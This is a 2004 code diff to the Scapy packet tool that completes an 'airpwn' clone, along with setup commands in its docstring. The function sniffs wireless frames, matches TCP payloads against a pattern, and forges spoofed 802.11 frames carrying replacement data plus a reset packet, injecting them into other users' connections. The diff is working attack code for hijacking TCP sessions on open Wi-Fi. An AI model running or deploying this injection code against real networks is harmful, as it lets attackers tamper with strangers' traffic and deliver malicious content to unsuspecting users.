@@ -21,6 +21,9 @@
 
 #
 # $Log: scapy.py,v $
+# Revision 0.9.17.7  2004/09/03 22:11:35  pbi
+# - finished airpwn()
+#
 # Revision 0.9.17.6  2004/08/13 16:49:51  pbi
 # - added first version of airpwn() clone
 #
@@ -430,7 +433,7 @@
 
 from __future__ import generators
 
-RCSID="$Id: scapy.py,v 0.9.17.6 2004/08/13 16:49:51 pbi Exp $"
+RCSID="$Id: scapy.py,v 0.9.17.7 2004/09/03 22:11:35 pbi Exp $"
 
 VERSION = RCSID.split()[2]+"beta"
 
@@ -4958,7 +4961,6 @@ def get_toDS():
             print "."
 
 
-def airpwn(iffrom, ifto, replace, pattern="", ignorepattern=""):
 #    if not ifto.endswith("ap"):
 #        print "iwpriv %s hostapd 1" % ifto
 #        os.system("iwpriv %s hostapd 1" % ifto)
@@ -4966,30 +4968,44 @@ def airpwn(iffrom, ifto, replace, pattern="", ignorepattern=""):
 #        
 #    os.system("iwconfig %s mode monitor" % iffrom)
 #    
+
+def airpwn(iffrom, ifto, replace, pattern="", ignorepattern=""):
+    """Before using this, initialize "iffrom" and "ifto" interfaces:
+iwconfig iffrom mode monitor
+iwpriv orig_ifto hostapd 1
+ifconfig ifto up
+note: if ifto=wlan0ap then orig_ifto=wlan0
+note: ifto and iffrom must be set on the same channel
+ex:
+ifconfig eth1 up
+iwconfig eth1 mode monitor
+iwconfig eth1 channel 11
+iwpriv wlan0 hostapd 1
+ifconfig wlan0ap up
+iwconfig wlan0 channel 11
+iwconfig wlan0 essid dontexist
+iwconfig wlan0 mode managed
+"""
+    
     ptrn = re.compile(pattern)
     iptrn = re.compile(ignorepattern)
-
-    while 1:
-        p, = sniff(iface=iffrom,count=1)
-
+    def do_airpwn(p, ifto=ifto, replace=replace, ptrn=ptrn, iptrn=iptrn):
         if not isinstance(p,Dot11):
-            continue
+            return
         if not p.FCfield & 1:
-            continue
-
-        
+            return
         if not p.haslayer(TCP):
-            continue
+            return
         ip = p.getlayer(IP)
         tcp = p.getlayer(TCP)
         pay = str(tcp.payload)
-        print "got tcp"
+#        print "got tcp"
         if not ptrn.match(pay):
-            continue
-        print "match 1"
+            return
+#        print "match 1"
         if iptrn.match(pay):
-            continue
-        print "match 2"
+            return
+#        print "match 2"
         del(p.payload.payload.payload)
         p.FCfield="from-DS"
         p.addr1,p.addr2 = p.addr2,p.addr1
@@ -5004,11 +5020,13 @@ def airpwn(iffrom, ifto, replace, pattern="", ignorepattern=""):
         q.getlayer(TCP).flags="RA"
         q.getlayer(TCP).seq+=len(replace)
         
-        print "send",repr(p)
-        print "send",repr(q)
-        sendp([p,q], iface=ifto)
-#        sendp(q, iface=ifto)
-        
+        sendp([p,q], iface=ifto, verbose=0)
+#        print "send",repr(p)        
+#        print "send",repr(q)
+        print p.sprintf("Sent %IP.src%:%IP.sport% > %IP.dst%:%TCP.dport%")
+
+    sniff(iface=iffrom,prn=do_airpwn)
+
             
         
     
